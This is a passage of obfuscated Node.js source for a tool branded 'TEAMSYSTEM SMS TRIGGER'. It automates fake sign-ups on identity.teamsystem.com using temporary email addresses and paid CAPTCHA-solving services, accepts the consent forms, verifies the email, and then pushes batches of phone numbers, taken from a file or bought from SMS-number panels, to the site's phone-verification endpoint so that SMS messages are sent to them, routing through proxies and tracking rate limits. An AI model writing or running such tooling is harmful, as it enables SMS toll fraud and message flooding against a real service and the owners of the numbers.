      v426.push("Consents%5B" + v443 + "%5D.Id=" + encodeURIComponent(v442.Id));
      v426.push("Consents%5B" + v443 + "%5D.AutoAcceptance=" + v442.AutoAcceptance), v426.push("Consents%5B" + v443 + "%5D.DefaultValue=" + v442.DefaultValue);
      v426.push("Consents%5B" + v443 + "%5D.Name=" + v442.Name), v426.push("Consents%5B" + v443 + "%5D.Position=" + v442.Position), v426.push("Consents%5B" + v443 + "%5D.Required=" + v442.Required), v426.push("Consents%5B" + v443 + "%5D.Text=" + v442.Text), v426.push("Consents%5B" + v443 + "%5D.Checked=" + v442.Checked);
    }), v426.push("g-recaptcha-response=" + encodeURIComponent(v425)), v426.push("__RequestVerificationToken=" + encodeURIComponent(v421)), SIGNUP_CONSENTS.forEach((v444, v445) => v426.push("Consents%5B" + v445 + "%5D.Checked=false"));
    const v427 = v426.join('&');
    v420 = await sendRequest(v415, "POST", {
      ...v417,
      'Content-Type': "application/x-www-form-urlencoded",
      'Origin': "https://identity.teamsystem.com",
      'Referer': v415,
      'Sec-Fetch-Site': "same-origin",
      'Sec-Fetch-User': '?1',
      'Cache-Control': "max-age=0",
      'Cookie': v412.get()
    }, v427, proxy, timeout), v412.absorb(v420.headers);
    if (v420.status !== 0x12e && v420.status !== 0xc8) throw new Error("Signup POST returned HTTP " + v420.status);
    if (v420.data && v420.data.includes("validation-summary-errors")) {
      const v446 = cheerio.load(v420.data),
        v447 = [];
      v446(".validation-summary-errors li, .field-validation-error").each((v448, v449) => v447.push(v446(v449).text().trim()));
      throw new Error("Signup validation failed: " + (v447.join(',\x20') || "unknown"));
    }
    debugLog(v407, "signup-post", "status=" + v420.status + " location=" + (v420.headers?.["location"] || "none")), onStatus("[4/8] GET privacy consents page ...");
    let v428 = v420.headers?.["location"] || "https://identity.teamsystem.com/Account/SignupPrivacyConsents?culture=en-US&email=" + encodeURIComponent(v414);
    if (!v428.startsWith("http")) v428 = "https://identity.teamsystem.com" + v428;
    v420 = await sendRequest(v428, "GET", {
      ...v417,
      'Referer': v415,
      'Sec-Fetch-Site': "same-origin",
      'Cookie': v412.get()
    }, null, proxy, timeout), v412.absorb(v420.headers);
    if ((v420.status === 0x12d || v420.status === 0x12e) && v420.redirectUrl) {
      const v450 = v420.redirectUrl.startsWith("http") ? v420.redirectUrl : "https://identity.teamsystem.com" + v420.redirectUrl;
      v420 = await sendRequest(v450, "GET", {
        ...v417,
        'Cookie': v412.get(),
        'Sec-Fetch-Site': "same-origin"
      }, null, proxy, timeout), v412.absorb(v420.headers), v428 = v450;
    }
    if (v420.status !== 0xc8) throw new Error("Consents page returned HTTP " + v420.status);
    const v429 = getCsrfToken(v420.data),
      v430 = parseConsents(v420.data);
    if (v430.length === 0x0) throw new Error("No consent items found on privacy page");
    debugLog(v407, "consent-count", v430.length), onStatus("[5/8] POST privacy consents ...");
    const v431 = [];
    v430.forEach((v451, v452) => {
      v431.push("Consents[" + v452 + "].Id=" + encodeURIComponent(v451.Id)), v431.push("Consents[" + v452 + "].AutoAcceptance=" + v451.AutoAcceptance);
      v431.push("Consents[" + v452 + "].DefaultValue=" + v451.DefaultValue), v431.push("Consents[" + v452 + "].Name=" + encodeURIComponent(v451.Name)), v431.push("Consents[" + v452 + "].Position=" + v451.Position);
      v431.push("Consents[" + v452 + "].Required=" + v451.Required), v431.push("Consents[" + v452 + "].Text=" + encodeURIComponent(v451.Text)), v431.push("Consents[" + v452 + "].Checked=true");
    }), v431.push("__RequestVerificationToken=" + encodeURIComponent(v429));
    const v432 = v431.join('&');
    v420 = await sendRequest(v428, "POST", {
      ...v417,
      'Content-Type': "application/x-www-form-urlencoded",
      'Origin': "https://identity.teamsystem.com",
      'Referer': v428,
      'Sec-Fetch-Site': "same-origin",
      'Sec-Fetch-User': '?1',
      'Cookie': v412.get()
    }, v432, proxy, timeout), v412.absorb(v420.headers), debugLog(v407, "consent-post", "status=" + v420.status + " location=" + (v420.headers?.["location"] || "none")), onStatus("[6/8] Waiting for verification email via " + v413.provider + " ...");
    const v433 = await pollForVerification(v413, 0x493e0);
    debugLog(v407, "verify-link", v433), onStatus("[6/8] Clicking verification link ...");
    let v434 = await sendRequest(v433, "GET", {
      ...v417,
      'Referer': "https://identity.teamsystem.com/",
      'Sec-Fetch-Site': "same-origin",
      'Cookie': v412.get()
    }, null, proxy, timeout);
    v412.absorb(v434.headers);
    if ((v434.status === 0x12d || v434.status === 0x12e) && v434.redirectUrl) {
      const v453 = v434.redirectUrl.startsWith("http") ? v434.redirectUrl : "https://identity.teamsystem.com" + v434.redirectUrl;
      v434 = await sendRequest(v453, "GET", {
        ...v417,
        'Cookie': v412.get(),
        'Sec-Fetch-Site': "same-origin"
      }, null, proxy, timeout), v412.absorb(v434.headers);
    }
    debugLog(v407, "email-verify", "status=" + v434.status), onStatus("[7/8] GET /Profile/Security ...");
    const v435 = "https://identity.teamsystem.com/Profile/Security";
    let v436 = v420.headers?.["location"] || v435;
    if (!v436.startsWith("http")) v436 = "https://identity.teamsystem.com" + v436;
    for (let v454 = 0x0; v454 < 0x5; v454++) {
      v420 = await sendRequest(v436, "GET", {
        ...v417,
        'Cookie': v412.get(),
        'Sec-Fetch-Site': "same-origin",
        'Referer': v428
      }, null, proxy, timeout), v412.absorb(v420.headers);
      if (v420.status === 0xc8) break;
      if ((v420.status === 0x12d || v420.status === 0x12e) && v420.redirectUrl) v436 = v420.redirectUrl.startsWith("http") ? v420.redirectUrl : "https://identity.teamsystem.com" + v420.redirectUrl;else break;
    }
    if (v420.status !== 0xc8) throw new Error("Profile/Security page returned HTTP " + v420.status);
    let v437;
    try {
      v437 = getCsrfToken(v420.data);
    } catch (v455) {
      throw new Error("Could not scrape CSRF token from Profile/Security page");
    }
    debugLog(v407, "security-csrf", v437.slice(0x0, 0x1e) + "...");
    const v438 = "https://identity.teamsystem.com/Profile/Security?handler=PhoneNumber",
      v439 = {};
    v439.Accept = "*/*", v439["Accept-Language"] = "en-US,en;q=0.9", v439["Accept-Encoding"] = "gzip, deflate, br", v439["Content-Type"] = "application/json", v439.Origin = "https://identity.teamsystem.com", v439.Referer = v435, v439.RequestVerificationToken = v437, v439["X-Requested-With"] = "XMLHttpRequest", v439["User-Agent"] = v411.userAgent, v439["sec-ch-ua"] = v411.secChUa, v439["sec-ch-ua-mobile"] = '?0', v439["sec-ch-ua-platform"] = v411.secChUaPlatform, v439["Sec-Fetch-Dest"] = "empty", v439["Sec-Fetch-Mode"] = "cors", v439["Sec-Fetch-Site"] = "same-origin";
    const v440 = v439,
      v441 = [];
    for (let v456 = 0x0; v456 < v405.length; v456++) {
      const v457 = normalizePhoneNumber(v405[v456]);
      onStatus("[8/8] SMS " + (v456 + 0x1) + '/' + v405.length + " → " + v457 + " ...");
      try {
        const v458 = {};
        v458.phoneNumber = v457;
        const v459 = JSON.stringify(v458);
        v420 = await sendRequest(v438, "POST", {
          ...v440,
          'Cookie': v412.get()
        }, v459, proxy, timeout);
        const v460 = (() => {
          try {
            return JSON.parse(v420.data);
          } catch {
            return {};
          }
        })();
        debugLog(v457, "sms-response", v460);
        if (v420.status === 0xc8 && v460.message && v460.message.toLowerCase().includes("sms sent")) {
          const v461 = {};
          v461.success = true, v461.message = v460.message, v461.phone = v457, v441.push(v461);
        } else {
          if (v420.status === 0x1ad) {
            const v462 = {};
            v462.success = false, v462.message = "Rate limited (429)", v462.phone = v457, v441.push(v462);
            break;
          } else {
            const v463 = {};
            v463.success = false, v463.message = v460.message || v460.error || "HTTP " + v420.status, v463.phone = v457, v441.push(v463);
          }
        }
      } catch (v464) {
        debugLog(v457, "sms-error", v464.message);
        const v465 = {};
        v465.success = false, v465.message = v464.message, v465.phone = v457, v441.push(v465);
      }
      if (v456 < v405.length - 0x1) await new Promise(v466 => setTimeout(v466, 0x5dc));
    }
    return v441;
  } catch (v467) {
    return debugLog(v407, "BATCH-ERROR", v467.message), fn6(v467.message);
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(v468) {
      this.totalNumbers = v468, this.processed = 0x0, this.successful = 0x0;
      this.failed = 0x0, this.startTime = Date.now();
    }
    ["addLog"](v469, v470) {
      let v471 = '';
      if (v470 === "success") v471 = chalk.hex("#0057B8").bold(" ✦ NOT REXY") + DIM(" │ ") + chalk.hex("#00C9A7")("SMS Sent") + DIM(" → ") + chalk.hex("#FFD700").bold(v469.replace("Triggered OTP for ", ''));else {
        if (v470 === "retry") v471 = chalk.hex("#FFD700").bold(" ↻ NOT REXY") + DIM(" │ ") + chalk.hex("#FFD700")(v469);else {
          const v472 = v469.match(/\+?\d{7,}/),
            v473 = v472 ? v472[0x0] : '',
            v474 = v469.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
          v471 = R.bold(" ✗ NOT REXY") + DIM(" │ ") + R(v473 ? '' + v473 : '') + DIM(v473 ? " → " : '') + G(v474);
        }
      }
      process.stdout.write("\r[K" + v471 + '\x0a');
      this.render();
    }
    ["setStatus"](v475) {}
    ["update"]() {}
    ["render"]() {
      const v476 = this.processed / Math.max(this.totalNumbers, 0x1),
        v477 = (v476 * 0x64).toFixed(0x1),
        v478 = Math.round(v476 * 0x14);
      const v479 = chalk.hex("#0057B8")('█'.repeat(v478)) + chalk.hex("#333333")('░'.repeat(0x14 - v478));
      const v480 = '\x20\x20' + B.bold("NOT REXY") + DIM(" ⮞ ") + v479 + G('\x20' + v477 + '%') + DIM("  │  ") + chalk.hex("#00C9A7").bold('✓\x20' + this.successful) + DIM('\x20\x20') + R.bold('✗\x20' + this.failed) + DIM("  [" + this.processed + '/' + this.totalNumbers + ']');
      process.stdout.write("\r[K" + v480);
    }
    ["stop"]() {
      process.stdout.write("[2K\r\n");
      const v481 = Math.floor((Date.now() - this.startTime) / 0x3e8),
        v482 = Math.floor(v481 / 0x3c),
        v483 = v481 % 0x3c;
      console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  TEAMSYSTEM SMS TRIGGER — COMPLETE         ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(0x6)) + "                       ") + C('║'));
      console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(0x6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan((v482 + 'm\x20' + v483 + 's').padEnd(0x6)) + "                       ") + C('║'));
      console.log(C("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v484, v485) {
    return new Promise(v486 => {
      let v487 = 0x0;
      process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY) process.stdin.setRawMode(true);
      const fn7 = () => {
        process.stdout.write("[2J[H");
        printHeader(), console.log("   [33m" + v484 + "[0m\n");
        v485.forEach((v488, v489) => {
          if (v489 === v487) console.log("   [36m➔[35m " + v488.name + "[0m");else console.log("     [90m" + v488.name + "[0m");
        });
      };
      fn7();
      const fn8 = (v490, v491) => {
        if (v491.ctrl && v491.name === 'c') process.exit(0x0);
        if (v491.name === 'up') v487 = (v487 - 0x1 + v485.length) % v485.length, fn7();else {
          if (v491.name === "down") v487 = (v487 + 0x1) % v485.length, fn7();else v491.name === "return" && (process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn8), v486(v485[v487].value));
        }
      };
      process.stdin.on("keypress", fn8);
    });
  }
  async function promptText(v492, v493) {
    return new Promise(v494 => {
      process.stdout.write("   [33m" + v492 + "[0m ");
      let v495 = '';
      if (process.stdin.isTTY) process.stdin.setRawMode(false);
      process.stdin.resume();
      const fn9 = v496 => {
        const v497 = v496.toString();
        if (v497.includes('\x0a') || v497.includes('\x0d')) {
          process.stdin.removeListener("data", fn9), v495 += v497.split(/[\r\n]/)[0x0];
          let v498 = v495.trim();
          if (v498.startsWith('\x22') && v498.endsWith('\x22')) v498 = v498.slice(0x1, -1);
          v494(v498 || v493);
        } else v495 += v497;
      };
      process.stdin.on("data", fn9);
    });
  }
  async function interactiveWizard() {
    let v499 = 0x1,
      v500 = "file",
      v501 = "numbers.txt",
      v502 = 0x14;
    let v503 = null,
      v504 = null,
      v505 = null,
      v506 = null,
      v507 = "none",
      v508 = '',
      v509 = '',
      v510 = "anticaptcha",
      v511 = '';
    const v512 = path.join(__dirname, ".nexa_api_key");
    let v513 = '',
      v514 = [],
      v515 = 0x32,
      v516 = "/api/v1/numbers/get";
    while (true) {
      process.stdout.write("[2J[H"), printHeader();
      if (v499 === 0x1) {
        const v517 = {};
        v517.name = "🌐 Auto fetch from NexaOTP Panel", v517.value = "nexa";
        const v518 = {};
        v518.name = "🔥 Auto fetch from Stex (2oo9)", v518.value = "stex";
        const v519 = {};
        v519.name = "📱 Auto fetch from SMS Bower", v519.value = "smsbower";
        const v520 = await selectOption("SELECT NUMBER SOURCE", [{
          'name': "📁 Load from file (numbers.txt)",
          'value': "file"
        }, v517, {
          'name': "⚡ Auto fetch from Voltx (2oo9)",
          'value': "voltx"
        }, v518, v519, {
          'name': "⚡ Auto fetch from Zenex",
          'value': "zenex"
        }, {
          'name': "❌ Exit Program",
          'value': "exit"
        }]);
        if (v520 === "exit") process.exit(0x0);
        v500 = v520, v499 = 0x2;
      } else {
        if (v499 === 0x2) {
          if (v500 === "voltx" || v500 === "stex") {
            const v521 = v500 === "voltx" ? "Voltx ⚡" : "Stex 🔥",
              v522 = v500 === "voltx" ? VOLTX_KEY_FILE : STEX_KEY_FILE,
              v523 = v500 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/getnum" : "/MXS47FLFX0U/tness/@public/api/getnum",
              v524 = v500 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/console" : "/MXS47FLFX0U/tness/@public/api/console";
            let v525 = '',
              v526 = [],
              v527 = 0x32,
              v528 = 0x1,
              v529 = false;
            while (v528 <= 0x3 && !v529) {
              process.stdout.write("[2J[H"), printHeader();
              if (v528 === 0x1) {
                if (fs.existsSync(v522)) {
                  v525 = fs.readFileSync(v522, "utf8").trim();
                  const v530 = {};
                  v530.name = "Use saved key", v530.value = "use";
                  const v531 = {};
                  v531.name = "Enter new key", v531.value = "new";
                  const v532 = {};
                  v532.name = "Remove saved key", v532.value = "remove";
                  const v533 = await selectOption(v521 + " key found (" + v525.substring(0x0, 0xa) + "...)", [v530, v531, v532, {
                    'name': "⬅️ Back",
                    'value': "back"
                  }]);
                  if (v533 === "back") {
                    v529 = true;
                    break;
                  }
                  if (v533 === "remove") fs.existsSync(v522) && fs.unlinkSync(v522), v525 = '';else {
                    if (v533 === "new") v525 = '';
                  }
                }
                if (!v525) {
                  const v534 = await promptText("Enter " + v521 + " API Key (mauthapi):", '');
                  if (v534.toLowerCase() === "back") {
                    v529 = true;
                    break;
                  }
                  v525 = v534;
                  const v535 = {};
                  v535.name = "Yes", v535.value = "yes";
                  const v536 = {};
                  v536.name = 'No', v536.value = 'no';
                  const v537 = await selectOption("Save key?", [v535, v536]);
                  if (v537 === "yes" && v525) fs.writeFileSync(v522, v525, "utf8");
                }
                if (v525) v528 = 0x2;
              } else {
                if (v528 === 0x2) {
                  const v538 = {};
                  v538.name = "🔍 Auto Range Finder (scan console)", v538.value = "auto";
                  const v539 = {};
                  v539.name = "✏️  Enter manually", v539.value = "manual";
                  const v540 = {};
                  v540.name = "⬅️ Back", v540.value = "back";
                  const v541 = await selectOption("How to select ranges?", [v538, v539, v540]);
                  if (v541 === "back") {
                    v528 = 0x1;
                    continue;
                  }
                  if (v541 === "auto") {
                    const v542 = await autoRangeFinderFor2Oo(v525, v524, selectOption, promptText);
                    v542 && v542.length > 0x0 && (v526 = v542, v528 = 0x3);
                  } else {
                    v526 = [];
                    let v543 = true;
                    while (v543) {
                      const v544 = await promptText("Enter range #" + (v526.length + 0x1) + " (e.g. 39331XXX) or 'back':", '');
                      if (v544.toLowerCase() === "back") {
                        if (v526.length === 0x0) break;else {
                          v526.pop();
                          continue;
                        }
                      }
                      if (v544) v526.push(v544);
                      const v545 = {};
                      v545.name = "Yes", v545.value = "yes";
                      const v546 = {};
                      v546.name = 'No', v546.value = 'no';
                      const v547 = await selectOption("Added " + v526.length + ". Add another?", [v545, v546]);
                      if (v547 === 'no') v543 = false;
                    }
                    if (v526.length > 0x0) v528 = 0x3;
                  }
                } else {
                  if (v528 === 0x3) {
                    const v548 = await promptText("How many numbers? [default:50]:", '50');
                    if (v548.toLowerCase() === "back") {
                      v528 = 0x2;
                      continue;
                    }
                    v527 = parseInt(v548) || 0x32;
                    const v549 = {};
                    v549.provider = v500, v549.apiKey = v525, v549.getPath = v523, v549.consolePath = v524, v549.ranges = v526, v549.totalCount = v527, v504 = v549, v503 = null, v528 = 0x4;
                  }
                }
              }
            }
            if (v529) {
              v499 = 0x1;
              continue;
            }
            v499 = 0x3;
          } else {
            if (v500 === "smsbower") {
              let v550 = '',
                v551 = 'fb',
                v552 = '0',
                v553 = "0.5",
                v554 = 0x32,
                v555 = 0x1,
                v556 = false;
              while (v555 <= 0x4 && !v556) {
                process.stdout.write("[2J[H"), printHeader();
                if (v555 === 0x1) {
                  if (fs.existsSync(SMSBOWER_KEY_FILE)) {
                    v550 = fs.readFileSync(SMSBOWER_KEY_FILE, "utf8").trim();
                    const v557 = {};
                    v557.name = "Use saved key", v557.value = "use";
                    const v558 = {};
                    v558.name = "Enter new key", v558.value = "new";
                    const v559 = {};
                    v559.name = "Remove saved key", v559.value = "remove";
                    const v560 = {};
                    v560.name = "⬅️ Back", v560.value = "back";
                    const v561 = await selectOption("SMS Bower key found (" + v550.substring(0x0, 0xa) + "...)", [v557, v558, v559, v560]);
                    if (v561 === "back") {
                      v556 = true;
                      break;
                    }
                    if (v561 === "remove") fs.existsSync(SMSBOWER_KEY_FILE) && fs.unlinkSync(SMSBOWER_KEY_FILE), v550 = '';else {
                      if (v561 === "new") v550 = '';
                    }
                  }
                  if (!v550) {
                    v550 = await promptText("Enter SMS Bower API Key:", '');
                    if (v550.toLowerCase() === "back") {
                      v556 = true;
                      break;
                    }
                    const v562 = {};
                    v562.name = "Yes", v562.value = "yes";
                    const v563 = {};
                    v563.name = 'No', v563.value = 'no';
                    const v564 = await selectOption("Save key?", [v562, v563]);
                    if (v564 === "yes" && v550) fs.writeFileSync(SMSBOWER_KEY_FILE, v550, "utf8");
                  }
                  if (v550) v555 = 0x2;
                } else {
                  if (v555 === 0x2) {
                    v551 = await promptText("Service code (e.g. fb, ig) [default: fb]:", 'fb');
                    if (v551.toLowerCase() === "back") {
                      v555 = 0x1;
                      continue;
                    }
                    v551 = v551 || 'fb', v555 = 0x3;
                  } else {
                    if (v555 === 0x3) {
                      v552 = await promptText("Country code (0 = any) [default: 0]:", '0');
                      if (v552.toLowerCase() === "back") {
                        v555 = 0x2;
                        continue;
                      }
                      const v565 = await promptText("Max price per number [default: 0.5]:", "0.5");
                      v553 = v565 || "0.5", v555 = 0x4;
                    } else {
                      if (v555 === 0x4) {
                        const v566 = await promptText("How many numbers? [default: 50]:", '50');
                        if (v566.toLowerCase() === "back") {
                          v555 = 0x3;
                          continue;
                        }
                        v554 = parseInt(v566) || 0x32;
                        const v567 = {};
                        v567.apiKey = v550, v567.service = v551, v567.country = v552, v567.maxPrice = v553, v567.totalCount = v554, v505 = v567, v503 = null, v504 = null, v506 = null, v555 = 0x5;
                      }
                    }
                  }
                }
              }
              if (v556) {
                v499 = 0x1;
                continue;
              }
              v499 = 0x3;
            } else {
              if (v500 === "zenex") {
                let v568 = '',
                  v569 = [],
                  v570 = 0x32,
                  v571 = 0x1,
                  v572 = false;
                while (v571 <= 0x3 && !v572) {
                  process.stdout.write("[2J[H"), printHeader();
                  if (v571 === 0x1) {
                    if (fs.existsSync(ZENEX_KEY_FILE)) {
                      v568 = fs.readFileSync(ZENEX_KEY_FILE, "utf8").trim();
                      const v573 = {};
                      v573.name = "Enter new key", v573.value = "new";
                      const v574 = await selectOption("Zenex key found (" + v568.substring(0x0, 0xa) + "...)", [{
                        'name': "Use saved key",
                        'value': "use"
                      }, v573, {
                        'name': "Remove saved key",
                        'value': "remove"
                      }, {
                        'name': "⬅️ Back",
                        'value': "back"
                      }]);
                      if (v574 === "back") {
                        v572 = true;
                        break;
                      }
                      if (v574 === "remove") fs.existsSync(ZENEX_KEY_FILE) && fs.unlinkSync(ZENEX_KEY_FILE), v568 = '';else {
                        if (v574 === "new") v568 = '';
                      }
                    }
                    if (!v568) {
                      v568 = await promptText("Enter Zenex API Key (mapikey):", '');
                      if (v568.toLowerCase() === "back") {
                        v572 = true;
                        break;
                      }
                      const v575 = {};
                      v575.name = "Yes", v575.value = "yes";
                      const v576 = {};
                      v576.name = 'No', v576.value = 'no';
                      const v577 = await selectOption("Save key?", [v575, v576]);
                      if (v577 === "yes" && v568) fs.writeFileSync(ZENEX_KEY_FILE, v568, "utf8");
                    }
                    if (v568) v571 = 0x2;
                  } else {
                    if (v571 === 0x2) {
                      v569 = [];
                      let v578 = true;
                      while (v578) {
                        const v579 = await promptText("Enter range #" + (v569.length + 0x1) + " (e.g. 39331XXXXX) or 'back':", '');
                        if (v579.toLowerCase() === "back") {
                          if (v569.length === 0x0) {
                            v572 = true;
                            break;
                          } else {
                            v569.pop();
                            continue;
                          }
                        }
                        if (v579) v569.push(v579);
                        const v580 = {};
                        v580.name = "Yes", v580.value = "yes";
                        const v581 = {};
                        v581.name = 'No', v581.value = 'no';
                        const v582 = await selectOption("Added " + v569.length + ". Add another?", [v580, v581]);
                        if (v582 === 'no') v578 = false;
                      }
                      if (v569.length > 0x0) v571 = 0x3;
                    } else {
                      if (v571 === 0x3) {
                        const v583 = await promptText("How many numbers? [default: 50]:", '50');
                        if (v583.toLowerCase() === "back") {
                          v571 = 0x2;
                          continue;
                        }
                        v570 = parseInt(v583) || 0x32;
                        const v584 = {};
                        v584.apiKey = v568, v584.ranges = v569, v584.totalCount = v570, v506 = v584, v503 = null, v504 = null, v505 = null, v571 = 0x4;
                      }
                    }
                  }
                }
                if (v572) {
                  v499 = 0x1;
                  continue;
                }
                v499 = 0x3;
              } else {
                if (v500 === "file") {
                  const v585 = {};
                  v585.name = "✏️ Custom File Path", v585.value = "custom";
                  const v586 = {};
                  v586.name = "⬅️ Go Back", v586.value = "back";
                  const v587 = await selectOption("SELECT TARGET NUMBERS FILE", [v585, v586]);
                  if (v587 === "back") {
                    v499 = 0x1;
                    continue;
                  }
                  if (v587 === "custom") {
                    const v588 = await promptText("Enter Numbers File Path:", "numbers.txt");
                    if (v588.toLowerCase() === "back") continue;
                    v501 = v588;
                  } else v501 = v587;
                  if (!fs.existsSync(v501)) fs.writeFileSync(v501, '');
                  v503 = null, v499 = 0x3;
                } else {
                  let v589 = 0x1,
                    v590 = false;
                  while (v589 <= 0x4 && !v590) {
                    process.stdout.write("[2J[H"), printHeader();
                    if (v589 === 0x1) {
                      if (fs.existsSync(v512)) {
                        const v591 = fs.readFileSync(v512, "utf8").trim(),
                          v592 = {};
                        v592.name = "Yes, use saved key", v592.value = "yes";
                        const v593 = await selectOption("Found saved API Key (..." + v591.slice(-4) + "). Use it?", [v592, {
                          'name': "No, enter new key",
                          'value': 'no'
                        }, {
                          'name': "Delete saved key",
                          'value': "delete"
                        }, {
                          'name': "⬅️ Back",
                          'value': "back"
                        }]);
                        if (v593 === "back") {
                          v590 = true;
                          break;
                        }
                        if (v593 === "yes") v513 = v591;else v593 === "delete" && (fs.existsSync(v512) && fs.unlinkSync(v512), v513 = '');
                      }
                      if (!v513) {
                        const v594 = await promptText("Enter NexaOTP API Key (type 'back' to go back):", '');
                        if (v594.toLowerCase() === "back") {
                          v590 = true;
                          break;
                        }
                        v513 = v594;
                        const v595 = {};
                        v595.name = "Yes, save it", v595.value = "yes";
                        const v596 = {};
                        v596.name = 'No', v596.value = 'no';
                        const v597 = await selectOption("Save this key for future use?", [v595, v596]);
                        if (v597 === "yes" && v513) fs.writeFileSync(v512, v513, "utf8");
                      }
                      if (v513) v589 = 0x2;
                    } else {
                      if (v589 === 0x2) {
                        v514 = [];
                        let v598 = true;
                        while (v598) {
                          const v599 = await promptText("Enter range #" + (v514.length + 0x1) + " (e.g. 39331XXXXX) or type 'back':", '');
                          if (v599.toLowerCase() === "back") {
                            if (v514.length === 0x0) {
                              v589 = 0x1;
                              break;
                            } else {
                              v514.pop();
                              continue;
                            }
                          }
                          if (v599) v514.push(v599);
                          const v600 = {};
                          v600.name = "Yes, add another range", v600.value = "yes";
                          const v601 = {};
                          v601.name = "No, proceed", v601.value = 'no';
                          const v602 = {};
                          v602.name = "⬅️ Go Back", v602.value = "back";
                          const v603 = await selectOption("Added " + v514.length + " range(s). Add another?", [v600, v601, v602]);
                          if (v603 === "back") {
                            v589 = 0x1;
                            break;
                          }
                          if (v603 === 'no') v598 = false;
                        }
                        if (v514.length > 0x0) v589 = 0x3;
                      } else {
                        if (v589 === 0x3) {
                          const v604 = await promptText("How many numbers? [default: 50]:", '50');
                          if (v604.toLowerCase() === "back") {
                            v589 = 0x2;
                            continue;
                          }
                          v515 = parseInt(v604) || 0x32, v589 = 0x4;
                        } else {
                          if (v589 === 0x4) {
                            const v605 = {};
                            v605.name = "Server 1 (/get)", v605.value = "/api/v1/numbers/get";
                            const v606 = {};
                            v606.name = "Server 2 (/p2/get)", v606.value = "/api/v1/numbers/p2/get";
                            const v607 = {};
                            v607.name = "Server 3 (/p3/get)", v607.value = "/api/v1/numbers/p3/get";
                            const v608 = {};
                            v608.name = "⬅️ Back", v608.value = "back";
                            const v609 = await selectOption("SELECT NEXA SERVER", [v605, v606, v607, v608]);
                            if (v609 === "back") {
                              v589 = 0x3;
                              continue;
                            }
                            v516 = v609;
                            const v610 = {};
                            v610.apiKey = v513, v610.ranges = v514, v610.totalCount = v515, v610.serverEndpoint = v516, v503 = v610, v589 = 0x5;
                          }
                        }
                      }
                    }
                  }
                  if (v590) {
                    v499 = 0x1;
                    continue;
                  }
                  v499 = 0x3;
                }
              }
            }
          }
        } else {
          if (v499 === 0x3) {
            process.stdout.write("[2J[H"), printHeader();
            const v611 = {};
            v611.name = "🔷 Anti-Captcha (anti-captcha.com)", v611.value = "anticaptcha";
            const v612 = {};
            v612.name = "🔶 2Captcha (2captcha.com)", v612.value = "2captcha";
            const v613 = {};
            v613.name = "⚡ Both (Round-Robin, auto-fallback)", v613.value = "both";
            const v614 = {};
            v614.name = "⬅️ Back", v614.value = "back";
            const v615 = await selectOption("SELECT CAPTCHA SOLVER", [v611, v612, v613, v614]);
            if (v615 === "back") {
              v499 = 0x2;
              continue;
            }
            v510 = v615;
            async function fn10(v616, v617) {
              let v618 = '';
              if (fs.existsSync(v616)) {
                v618 = fs.readFileSync(v616, "utf8").trim();
                const v619 = {};
                v619.name = "Use saved key", v619.value = "use";
                const v620 = {};
                v620.name = "Enter new key", v620.value = "new";
                const v621 = {};
                v621.name = "Remove saved key", v621.value = "remove";
                const v622 = await selectOption(v617 + " key found (" + v618.substring(0x0, 0xc) + "...)", [v619, v620, v621]);
                if (v622 === "remove") fs.existsSync(v616) && fs.unlinkSync(v616), v618 = '';else {
                  if (v622 === "new") v618 = '';
                }
              }
              if (!v618) {
                v618 = await promptText("Enter " + v617 + " API Key:", '');
                const v623 = {};
                v623.name = "Yes", v623.value = "yes";
                const v624 = {};
                v624.name = 'No', v624.value = 'no';
                const v625 = await selectOption("Save key?", [v623, v624]);
                if (v625 === "yes" && v618) fs.writeFileSync(v616, v618, "utf8");
              }
              return v618;
            }
            if (v510 === "both") {
              {
                process.stdout.write("[2J[H");
                printHeader();
                console.log(Y("  ── Anti-Captcha Key ──"));
                v508 = await fn10(ANTI_CAPTCHA_KEY_FILE, "Anti-Captcha");
                process.stdout.write("[2J[H");
                printHeader();
                console.log(Y("  ── 2Captcha Key ──"));
                v509 = await fn10(TWOCAPTCHA_KEY_FILE, "2Captcha");
              }
            } else {
              const v626 = v510 === "2captcha" ? TWOCAPTCHA_KEY_FILE : ANTI_CAPTCHA_KEY_FILE,
                v627 = v510 === "2captcha" ? "2Captcha" : "Anti-Captcha",
                v628 = await fn10(v626, v627);
              if (v510 === "2captcha") v509 = v628;else v508 = v628;
            }
            v499 = 0x4;
          } else {
            if (v499 === 0x4) {
              process.stdout.write("[2J[H"), printHeader();
              let v629 = '';
              if (fs.existsSync(MAIL_CX_KEY_FILE)) {
                v629 = fs.readFileSync(MAIL_CX_KEY_FILE, "utf8").trim();
                const v630 = {};
                v630.name = "Use saved key", v630.value = "use";
                const v631 = {};
                v631.name = "Remove (use free fallback)", v631.value = "remove";
                const v632 = {};
                v632.name = "⬅️ Back", v632.value = "back";
                const v633 = await selectOption("📧 mail.cx key found (" + v629.substring(0x0, 0xe) + "...)", [v630, {
                  'name': "Enter new key",
                  'value': "new"
                }, v631, v632]);
                if (v633 === "back") {
                  v499 = 0x3;
                  continue;
                }
                if (v633 === "remove") fs.existsSync(MAIL_CX_KEY_FILE) && fs.unlinkSync(MAIL_CX_KEY_FILE), v629 = '';else {
                  if (v633 === "new") v629 = '';
                }
              }
              if (!v629) {
                const v634 = {};
                v634.name = "Skip — use free fallback (mail.tm / Guerrilla Mail)", v634.value = "skip";
                const v635 = await selectOption("📧 mail.cx Temp Email Provider", [{
                  'name': "Enter mail.cx API key (tm_live_...)",
                  'value': "enter"
                }, v634, {
                  'name': "⬅️ Back",
                  'value': "back"
                }]);
                if (v635 === "back") {
                  v499 = 0x3;
                  continue;
                }
                if (v635 === "enter") {
                  v629 = await promptText("Enter mail.cx API Key (tm_live_...):", '');
                  if (v629.toLowerCase() === "back") {
                    v499 = 0x3;
                    continue;
                  }
                  const v636 = {};
                  v636.name = "Yes", v636.value = "yes";
